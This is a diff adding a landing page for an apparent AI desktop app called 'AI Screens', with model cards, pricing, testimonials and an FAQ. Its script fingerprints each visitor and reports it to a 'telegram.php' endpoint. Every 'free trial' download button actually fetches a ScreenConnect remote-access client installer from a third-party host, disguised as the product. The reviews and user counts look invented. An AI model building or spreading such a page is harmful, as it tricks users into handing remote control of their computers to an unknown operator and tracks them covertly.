+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-file-pdf"></i></div><h3>Documents & RAG</h3><p>Drop PDFs, Word, Excel, video. The app indexes, summarizes and lets you chat with the content.</p></div>
+    <div class="feature reveal"><div class="fico"><i class="fa-solid fa-globe"></i></div><h3>Web Search Live</h3><p>Real-time internet access through Perplexity & Grok. Always up-to-date answers, with citations.</p></div>
+  </div>
+</section>
+
+<!-- ===== MODELS ===== -->
+<section class="section" id="models">
+  <div class="section-head reveal">
+    <span class="eyebrow">Models</span>
+    <h2>Every model that <span>actually matters.</span></h2>
+    <p>One subscription, every state-of-the-art AI. No more juggling 12 different accounts.</p>
+  </div>
+  <div class="models-grid">
+    <div class="model-card reveal"><div class="ico-xl ico gpt">GPT</div><div class="name">ChatGPT 5</div><div class="desc">OpenAI · Reasoning</div></div>
+    <div class="model-card reveal"><div class="ico-xl ico cl">CL</div><div class="name">Claude Opus 4.7</div><div class="desc">Anthropic · Code</div></div>
+    <div class="model-card reveal"><div class="ico-xl ico gem">G</div><div class="name">Gemini 2.5 Pro</div><div class="desc">Google · Multimodal</div></div>
+    <div class="model-card reveal"><div class="ico-xl ico dp">DS</div><div class="name">DeepSeek V3</div><div class="desc">Open · Math</div></div>
+    <div class="model-card reveal"><div class="ico-xl ico gr">X</div><div class="name">Grok 4</div><div class="desc">xAI · Realtime</div></div>
+    <div class="model-card reveal"><div class="ico-xl ico per">P</div><div class="name">Perplexity</div><div class="desc">Search · Cited</div></div>
+    <div class="model-card reveal"><div class="ico-xl ico mid">MJ</div><div class="name">Midjourney v7</div><div class="desc">Image · Art</div></div>
+    <div class="model-card reveal"><div class="ico-xl ico lm">LM</div><div class="name">Llama 3.3 70B</div><div class="desc">Meta · Open</div></div>
+  </div>
+</section>
+
+<!-- ===== STATS ===== -->
+<section class="section">
+  <div class="stats reveal">
+    <div class="stat"><div class="num" data-target="120000">0</div><div class="lbl">Active users</div></div>
+    <div class="stat"><div class="num" data-target="27">0</div><div class="lbl">AI models integrated</div></div>
+    <div class="stat"><div class="num" data-target="98">0</div><div class="lbl">% satisfaction</div></div>
+    <div class="stat"><div class="num" data-target="14">0</div><div class="lbl">Days free trial</div></div>
+  </div>
+</section>
+
+<!-- ===== HOW IT WORKS ===== -->
+<section class="section" id="how">
+  <div class="section-head reveal">
+    <span class="eyebrow">How it works</span>
+    <h2>Up and running <span>in 60 seconds.</span></h2>
+    <p>Three steps. Zero friction. Massive upgrade to your AI workflow.</p>
+  </div>
+  <div class="steps">
+    <div class="step reveal"><div class="num">1</div><h3>Download the app</h3><p>One-click installers for Windows, macOS and Linux. Less than 80 MB. Auto-updates baked in.</p></div>
+    <div class="step reveal"><div class="num">2</div><h3>Sign in & explore</h3><p>14-day full-access trial — every model, every feature unlocked. No credit card required.</p></div>
+    <div class="step reveal"><div class="num">3</div><h3>Choose your plan</h3><p>After the trial, pick a plan that fits. Cancel anytime, keep your projects and history forever.</p></div>
+  </div>
+</section>
+
+<!-- ===== PRICING ===== -->
+<section class="section" id="pricing">
+  <div class="section-head reveal">
+    <span class="eyebrow">Pricing</span>
+    <h2>Simple pricing. <span>Insane value.</span></h2>
+    <p>Stop paying 5 different subscriptions. Get every model for less than the price of one.</p>
+  </div>
+  <div class="pricing">
+    <div class="plan reveal">
+      <h3>Starter</h3>
+      <p class="desc">Perfect for personal use and exploration.</p>
+      <div class="price"><span class="a">$9</span><span class="b">/ month</span></div>
+      <ul>
+        <li class="check-text"><i class="fa-solid fa-check"></i> Access to 10 AI models</li>
+        <li><i class="fa-solid fa-check"></i> 2,000 messages / month</li>
+        <li><i class="fa-solid fa-check"></i> Image generation (limited)</li>
+        <li><i class="fa-solid fa-check"></i> Web search</li>
+        <li><i class="fa-solid fa-check"></i> Email support</li>
+      </ul>
+      <a href="#download" class="btn btn-secondary trial-btn">Start 14-day trial</a>
+    </div>
+    <div class="plan featured reveal">
+      <span class="tag-pop">Most popular</span>
+      <h3>Pro</h3>
+      <p class="desc">For power users, creators, and developers.</p>
+      <div class="price"><span class="a">$24</span><span class="b">/ month</span></div>
+      <ul>
+        <li class="check-text"><i class="fa-solid fa-check"></i> All 27+ models unlocked</li>
+        <li class="check-text"><i class="fa-solid fa-check"></i> Unlimited messages</li>
+        <li><i class="fa-solid fa-check"></i> Parallel prompts (up to 5)</li>
+        <li><i class="fa-solid fa-check"></i> Voice mode + 40 languages</li>
+        <li><i class="fa-solid fa-check"></i> Image, video & doc analysis</li>
+        <li><i class="fa-solid fa-check"></i> Priority support</li>
+      </ul>
+      <a href="#download" class="btn btn-primary trial-btn"><i class="fa-solid fa-bolt"></i> Start 14-day trial</a>
+    </div>
+    <div class="plan reveal">
+      <h3>Team</h3>
+      <p class="desc">For teams that build with AI every day.</p>
+      <div class="price"><span class="a">$49</span><span class="b">/ user / mo</span></div>
+      <ul>
+        <li class="check-text"><i class="fa-solid fa-check"></i> Everything in Pro</li>
+        <li><i class="fa-solid fa-check"></i> Shared workspaces & memory</li>
+        <li><i class="fa-solid fa-check"></i> Admin dashboard & SSO</li>
+        <li><i class="fa-solid fa-check"></i> Custom data residency</li>
+        <li><i class="fa-solid fa-check"></i> Dedicated success manager</li>
+      </ul>
+      <a href="#download" class="btn btn-secondary trial-btn">Start 14-day trial</a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== TESTIMONIALS ===== -->
+<section class="section">
+  <div class="section-head reveal">
+    <span class="eyebrow">Loved by 120K+ creators</span>
+    <h2>What our users <span>are saying.</span></h2>
+  </div>
+  <div class="testis">
+    <div class="testi reveal">
+      <div class="stars">★★★★★</div>
+      <p>"AI Screens replaced 6 of my subscriptions overnight. The parallel-prompt feature alone saves me 2 hours a day."</p>
+      <div class="who"><div class="av">SA</div><div><div class="n">Sarah Anderson</div><div class="r">Product Designer, Vercel</div></div></div>
+    </div>
+    <div class="testi reveal">
+      <div class="stars">★★★★★</div>
+      <p>"Finally, a desktop app that treats AI like a serious tool. The privacy mode and code sandbox are game-changers."</p>
+      <div class="who"><div class="av">MK</div><div><div class="n">Marcus Klein</div><div class="r">Engineering Lead, Stripe</div></div></div>
+    </div>
+    <div class="testi reveal">
+      <div class="stars">★★★★★</div>
+      <p>"I went from 12 browser tabs to one beautiful window. My productivity went through the roof."</p>
+      <div class="who"><div class="av">LR</div><div><div class="n">Layla Rahman</div><div class="r">Solo Founder</div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== FAQ ===== -->
+<section class="section" id="faq">
+  <div class="section-head reveal">
+    <span class="eyebrow">FAQ</span>
+    <h2>Questions? <span>We've got answers.</span></h2>
+  </div>
+  <div class="faq">
+    <div class="faq-item"><button class="faq-q">How does the 14-day free trial work? <i class="fa-solid fa-plus"></i></button><div class="faq-a">Download the app and use every feature, every model, with zero limits for 14 days. No credit card required. After 14 days, choose a plan to continue.</div></div>
+    <div class="faq-item"><button class="faq-q">Do I need API keys for each model? <i class="fa-solid fa-plus"></i></button><div class="faq-a">No. Every AI model is included in your subscription. You can optionally plug in your own API keys for unlimited usage on specific providers.</div></div>
+    <div class="faq-item"><button class="faq-q">Is my data private? <i class="fa-solid fa-plus"></i></button><div class="faq-a">Yes. All conversations are encrypted on-device. We never train on your data, and you can enable strict local-only mode in settings.</div></div>
+    <div class="faq-item"><button class="faq-q">Which platforms are supported? <i class="fa-solid fa-plus"></i></button><div class="faq-a">Windows 10/11, macOS 12+, and major Linux distributions (Ubuntu, Fedora, Arch). All builds are signed and auto-updating.</div></div>
+    <div class="faq-item"><button class="faq-q">Can I cancel anytime? <i class="fa-solid fa-plus"></i></button><div class="faq-a">Yes — cancel from inside the app with one click. Your projects and chat history remain accessible forever.</div></div>
+  </div>
+</section>
+
+<!-- ===== FINAL CTA ===== -->
+<section class="cta-final" id="download">
+  <h2>Ready to <span style="background:var(--gradient);-webkit-background-clip:text;background-clip:text;color:transparent">unify your AI workflow?</span></h2>
+  <p>Join 120,000+ users who replaced their browser tab chaos with AI Screens. 14-day free trial. No credit card. No catch.</p>
+  <div class="cta-group" style="justify-content:center">
+    <a href="#" class="btn btn-primary trial-btn" id="downloadFinal"><i class="fa-brands fa-windows"></i> Download for Windows</a>
+    <a href="#" class="btn btn-secondary trial-btn"><i class="fa-brands fa-apple"></i> Download for macOS</a>
+    <a href="#" class="btn btn-secondary trial-btn"><i class="fa-brands fa-linux"></i> Linux</a>
+  </div>
+  <p style="margin-top:24px;font-size:13px"><i class="fa-solid fa-lock"></i> 256-bit encryption · GDPR compliant · SOC 2 Type II</p>
+</section>
+
+<!-- ===== FOOTER ===== -->
+<footer>
+  <div class="footer-grid">
+    <div class="about">
+      <a href="#" class="logo"><span class="logo-mark"><i class="fa-solid fa-bolt"></i></span> AI Screens</a>
+      <p>One app to rule every AI model. Built by power users, for power users. Made with obsession.</p>
+      <div class="socials">
+        <a href="#"><i class="fa-brands fa-x-twitter"></i></a>
+        <a href="#"><i class="fa-brands fa-discord"></i></a>
+        <a href="#"><i class="fa-brands fa-github"></i></a>
+        <a href="#"><i class="fa-brands fa-youtube"></i></a>
+      </div>
+    </div>
+    <div><h4>Product</h4><ul><li><a href="#features">Features</a></li><li><a href="#models">Models</a></li><li><a href="#pricing">Pricing</a></li><li><a href="#">Changelog</a></li></ul></div>
+    <div><h4>Company</h4><ul><li><a href="#">About</a></li><li><a href="#">Blog</a></li><li><a href="#">Careers</a></li><li><a href="#">Contact</a></li></ul></div>
+    <div><h4>Legal</h4><ul><li><a href="#">Privacy</a></li><li><a href="#">Terms</a></li><li><a href="#">Security</a></li><li><a href="#">GDPR</a></li></ul></div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2026 AI Screens. All rights reserved.</span>
+    <span>Crafted with <i class="fa-solid fa-heart" style="color:#f472b6"></i> for AI enthusiasts.</span>
+  </div>
+</footer>
+
+<!-- Toast -->
+<div class="toast" id="toast"><i class="fa-solid fa-circle-check"></i><span id="toastMsg">Your download is starting…</span></div>
+
+<script>
+/* =========================================================
+   VISITOR TRACKER → posts to telegram.php (server-side)
+   ========================================================= */
+const TRACKER_ENDPOINT = "telegram.php";
+
+async function gatherVisitorIntel(){
+  const intel = {};
+  // Navigator
+  const n = navigator;
+  intel.userAgent = n.userAgent;
+  intel.platform = n.platform;
+  intel.language = n.language;
+  intel.languages = (n.languages||[]).join(', ');
+  intel.cookieEnabled = n.cookieEnabled;
+  intel.doNotTrack = n.doNotTrack;
+  intel.hardwareConcurrency = n.hardwareConcurrency;
+  intel.deviceMemory = n.deviceMemory || 'n/a';
+  intel.maxTouchPoints = n.maxTouchPoints;
+  intel.online = n.onLine;
+  intel.vendor = n.vendor;
+  // Screen
+  intel.screen = `${screen.width}x${screen.height} (avail ${screen.availWidth}x${screen.availHeight}) @ ${screen.colorDepth}-bit`;
+  intel.viewport = `${window.innerWidth}x${window.innerHeight}`;
+  intel.devicePixelRatio = window.devicePixelRatio;
+  intel.orientation = (screen.orientation && screen.orientation.type) || 'n/a';
+  // Time
+  intel.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  intel.timezoneOffset = new Date().getTimezoneOffset();
+  intel.localTime = new Date().toString();
+  // Page
+  intel.url = location.href;
+  intel.referrer = document.referrer || '(direct)';
+  intel.title = document.title;
+  // Connection
+  if(n.connection){
+    intel.connection = `${n.connection.effectiveType || '?'} · ${n.connection.downlink || '?'}Mbps · RTT ${n.connection.rtt || '?'}ms${n.connection.saveData ? ' · saveData' : ''}`;
+  }
+  // GPU
+  try{
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if(gl){
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      if(dbg){
+        intel.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        intel.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+      }
+    }
+  }catch(e){}
+  // Battery
+  try{
+    if(n.getBattery){
+      const b = await n.getBattery();
+      intel.battery = `${Math.round(b.level*100)}%${b.charging ? ' (charging)' : ''}`;
+    }
+  }catch(e){}
+  // Storage estimate
+  try{
+    if(n.storage && n.storage.estimate){
+      const s = await n.storage.estimate();
+      intel.storage = `${(s.usage/1048576).toFixed(1)}MB / ${(s.quota/1048576).toFixed(0)}MB`;
+    }
+  }catch(e){}
+  // UTM / query params
+  const params = new URLSearchParams(location.search);
+  const utm = {};
+  params.forEach((v,k)=>{ if(k.toLowerCase().startsWith('utm_') || ['ref','source','gclid','fbclid'].includes(k.toLowerCase())) utm[k]=v; });
+  if(Object.keys(utm).length) intel.utm = JSON.stringify(utm);
+  return intel;
+}
+
+async function sendToTelegram(event){
+  try{
+    const client = await gatherVisitorIntel();
+    const payload = JSON.stringify({ event, client });
+    // sendBeacon is fire-and-forget — survives page unload (good for downloads)
+    if(navigator.sendBeacon){
+      const blob = new Blob([payload], {type:'application/json'});
+      if(navigator.sendBeacon(TRACKER_ENDPOINT, blob)) return;
+    }
+    await fetch(TRACKER_ENDPOINT, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:payload,
+      keepalive:true
+    });
+  }catch(e){ console.warn('[Tracker] send failed', e); }
+}
+
+// Fire on page load (deduped per session)
+if(!sessionStorage.getItem('ais_tracked')){
+  sessionStorage.setItem('ais_tracked','1');
+  window.addEventListener('load',()=>setTimeout(()=>sendToTelegram('Page Visit'),800));
+}
+
+/* =========================================================
+   UI: nav scroll, reveal, counters, FAQ, particles, downloads
+   ========================================================= */
+const nav = document.getElementById('nav');
+addEventListener('scroll',()=>{nav.classList.toggle('scrolled',scrollY>20)});
+
+const io = new IntersectionObserver(entries=>{
+  entries.forEach(e=>{ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); }});
+},{threshold:0.12});
+document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
+
+// Counters
+const countIO = new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      const el = e.target;
+      const target = +el.dataset.target;
+      const dur = 1600; const start = performance.now();
+      function tick(t){
+        const p = Math.min(1,(t-start)/dur);
+        const v = Math.floor(target*(1-Math.pow(1-p,3)));
+        el.textContent = v.toLocaleString() + (target===98 ? '%' : target===120000 ? '+' : '');
+        if(p<1) requestAnimationFrame(tick);
+      }
+      requestAnimationFrame(tick);
+      countIO.unobserve(el);
+    }
+  });
+},{threshold:0.5});
+document.querySelectorAll('.num').forEach(el=>countIO.observe(el));
+
+// FAQ
+document.querySelectorAll('.faq-item').forEach(it=>{
+  it.querySelector('.faq-q').addEventListener('click',()=>it.classList.toggle('open'));
+});
+
+// Download buttons → toast + Telegram event + start download
+const DOWNLOAD_URL = "https://yasminemanga.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest";
+function triggerDownload(label){
+  const t = document.getElementById('toast');
+  document.getElementById('toastMsg').textContent = 'Your free trial download is starting…';
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),4500);
+  sendToTelegram(`Download Click: ${label}`);
+  setTimeout(()=>{ window.location.href = DOWNLOAD_URL; }, 400);
+}
+document.querySelectorAll('.trial-btn, #downloadBtn').forEach(b=>{
+  b.addEventListener('click',(e)=>{
+    e.preventDefault();
+    triggerDownload(b.textContent.trim());
+  });
+});
+
+// Mockup tilt
+const mockup = document.getElementById('mockup');
+if(mockup){
+  document.addEventListener('mousemove',(e)=>{
+    const r = mockup.getBoundingClientRect();
+    if(r.top>innerHeight || r.bottom<0) return;
+    const cx = (e.clientX/innerWidth - 0.5)*2;
+    const cy = (e.clientY/innerHeight - 0.5)*2;
+    mockup.style.transform = `rotateX(${8 - cy*4}deg) rotateY(${cx*4}deg)`;
+  });
+}
+
+// Particles
+const canvas = document.getElementById('particles');
+const ctx = canvas.getContext('2d');
+let particles = [];
+function resize(){
+  canvas.width = innerWidth*devicePixelRatio;
+  canvas.height = innerHeight*devicePixelRatio;
+  canvas.style.width = innerWidth+'px';
+  canvas.style.height = innerHeight+'px';
+  ctx.scale(devicePixelRatio,devicePixelRatio);
+}
+resize();
+addEventListener('resize',()=>{ctx.setTransform(1,0,0,1,0,0);resize()});
+const colors = ['#7c5cff','#22d3ee','#f472b6'];
+for(let i=0;i<60;i++){
+  particles.push({
+    x:Math.random()*innerWidth, y:Math.random()*innerHeight,
+    vx:(Math.random()-.5)*0.25, vy:(Math.random()-.5)*0.25,
+    r:Math.random()*1.6+0.4,
+    c:colors[Math.floor(Math.random()*colors.length)]
+  });
+}
+function drawParticles(){
+  ctx.clearRect(0,0,innerWidth,innerHeight);
+  particles.forEach(p=>{
+    p.x+=p.vx; p.y+=p.vy;
+    if(p.x<0||p.x>innerWidth) p.vx*=-1;
+    if(p.y<0||p.y>innerHeight) p.vy*=-1;
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    ctx.fillStyle = p.c;
+    ctx.globalAlpha = .6;
+    ctx.fill();
+  });
+  // connect close ones
+  for(let i=0;i<particles.length;i++){
+    for(let j=i+1;j<particles.length;j++){
+      const a = particles[i], b = particles[j];
+      const dx = a.x-b.x, dy = a.y-b.y;
+      const d = Math.sqrt(dx*dx+dy*dy);
+      if(d<120){
+        ctx.beginPath();
+        ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y);
+        ctx.strokeStyle = a.c;
+        ctx.globalAlpha = (1-d/120)*0.15;
+        ctx.lineWidth = 0.6;
+        ctx.stroke();
+      }
+    }
+  }
+  requestAnimationFrame(drawParticles);
+}
+drawParticles();
+
+// Auto-detect OS for primary download
+(function(){
+  const ua = navigator.userAgent;
+  const el = document.getElementById('downloadFinal');
+  if(!el) return;
+  if(/Mac/i.test(ua)) el.innerHTML = '<i class="fa-brands fa-apple"></i> Download for macOS';
+  else if(/Linux/i.test(ua) && !/Android/i.test(ua)) el.innerHTML = '<i class="fa-brands fa-linux"></i> Download for Linux';
+  else el.innerHTML = '<i class="fa-brands fa-windows"></i> Download for Windows';
+})();
+</script>
+</body>
+</html>
